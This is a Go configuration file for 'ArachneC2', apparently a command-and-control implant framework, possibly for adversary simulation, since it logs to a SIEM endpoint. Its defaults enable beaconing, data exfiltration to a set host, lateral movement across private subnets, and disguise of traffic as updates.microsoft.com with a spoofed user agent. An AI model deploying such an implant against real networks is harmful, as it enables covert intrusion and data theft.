// internal/config/config.go
// ArachneC2 — Configuration
package config

import (
	"encoding/json"
	"fmt"
	"os"
	"time"
)

// Config holds all ArachneC2 runtime configuration.
type Config struct {
	NodeID          string        `json:"node_id"`
	NodeRole        string        `json:"node_role"`
	BeaconInterval  time.Duration `json:"beacon_interval"`
	BeaconJitter    float64       `json:"beacon_jitter"`
	BeaconURL       string        `json:"beacon_url"`
	PeerList        []string      `json:"peer_list"`
	ListenPort      int           `json:"listen_port"`
	MaxPeers        int           `json:"max_peers"`
	ExfilEnabled    bool          `json:"exfil_enabled"`
	ExfilTarget     string        `json:"exfil_target"`
	ExfilChunkKB    int           `json:"exfil_chunk_kb"`
	ExfilInterval   time.Duration `json:"exfil_interval"`
	LateralEnabled  bool          `json:"lateral_enabled"`
	LateralTargets  []string      `json:"lateral_targets"`
	LateralInterval time.Duration `json:"lateral_interval"`
	UseHTTPS        bool          `json:"use_https"`
	UserAgent       string        `json:"user_agent"`
	MimicDomain     string        `json:"mimic_domain"`
	LogFile         string        `json:"log_file"`
	LogLevel        string        `json:"log_level"`
	SIEMIngest      string        `json:"siem_ingest"`
}

func Default() *Config {
	return &Config{
		NodeID:          generateNodeID(),
		NodeRole:        "implant",
		BeaconInterval:  30 * time.Second,
		BeaconJitter:    0.3,
		BeaconURL:       "http://127.0.0.1:8888/beacon",
		PeerList:        []string{},
		ListenPort:      4444,
		MaxPeers:        5,
		ExfilEnabled:    true,
		ExfilTarget:     "192.168.1.100",
		ExfilChunkKB:    4,
		ExfilInterval:   60 * time.Second,
		LateralEnabled:  true,
		LateralTargets:  []string{"10.0.0.0/24", "192.168.1.0/24"},
		LateralInterval: 120 * time.Second,
		UseHTTPS:        false,
		UserAgent:       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		MimicDomain:     "updates.microsoft.com",
		LogFile:         "/tmp/arachne-events.jsonl",
		LogLevel:        "info",
		SIEMIngest:      "http://localhost:5000/api/v1/ingress",
	}
}

func Load(path string) (*Config, error) {
	cfg := Default()
	data, err := os.ReadFile(path)
	if err != nil {
		return cfg, nil
	}
	if err := json.Unmarshal(data, cfg); err != nil {
		return nil, err
	}
	return cfg, nil
}

func generateNodeID() string {
	hostname, _ := os.Hostname()
	if hostname == "" {
		hostname = "unknown"
	}
	return fmt.Sprintf("ARC-%08x", fnv32(hostname))
}

func fnv32(s string) uint32 {
	var h uint32 = 2166136261
	for i := 0; i < len(s); i++ {
		h ^= uint32(s[i])
		h *= 16777619
	}
	return h
}
